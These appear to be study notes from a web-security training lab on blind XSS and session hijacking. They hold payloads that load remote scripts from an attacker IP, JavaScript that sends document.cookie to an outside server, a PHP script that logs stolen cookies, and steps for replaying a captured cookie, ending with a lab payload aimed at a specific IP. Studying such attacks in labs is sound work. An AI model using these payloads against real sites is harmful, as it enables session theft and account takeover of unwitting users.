With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

## Blind XSS Detection
We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a `Blind XSS` vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

Let's run the test on the web application on (`/hijacking`) in the server at the end of this section. We see a User Registration page with multiple fields, so let's try to submit a `test` user to see how the form handles the data:
![[Pasted image 20251121155602.png]]

As we can see, once we submit the form we get the following message:
![[Pasted image 20251121155612.png]]


we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

However, this introduces two issues:
1. `How can we know which specific field is vulnerable?` Since any of the fields may execute our code, we can't know which of them did.
2. `How can we know what XSS payload to use?` Since the page may be vulnerable, but the payload may not work?

## Loading a Remote Script
In HTML, we can write JavaScript code within the `<script>` tags, but we can also include a remote script by providing its URL, as follows:
```html
<script src="http://OUR_IP/script.js"></script>
```

So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from `script.js` to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
```html
<script src="http://OUR_IP/username"></script>
```

If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

As we can see, various payloads start with an injection like `'>`, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the `XSS Discovery` section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.

Before we start sending payloads, we need to start a listener on our VM, using `netcat` or `php` as shown in a previous section:
Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```
Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

## Session Hijacking
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

We can write any of these JavaScript payloads to `script.js`, which will be hosted on our VM as well:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Now, we can change the URL in the XSS payload we found earlier to use `script.js` (`don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload`):
```html
<script src=http://OUR_IP/script.js></script>
```

We can save the following PHP script as `index.php`, and re-run the PHP server again:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for `script.js`, which in turn will make another request with the cookie value:
```shell-session
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Finally, we can use this cookie on the `login.php` page to access the victim's account. To do so, once we navigate to `/hijacking/login.php`, we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools. Then, we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before `=` and the `Value` is the part after `=` from our stolen cookie:
![[Pasted image 20251121160806.png]]


### Lab Payload:
"><script>new Image().src='http://10.10.15.104/index.php?c='+document.cookie</script>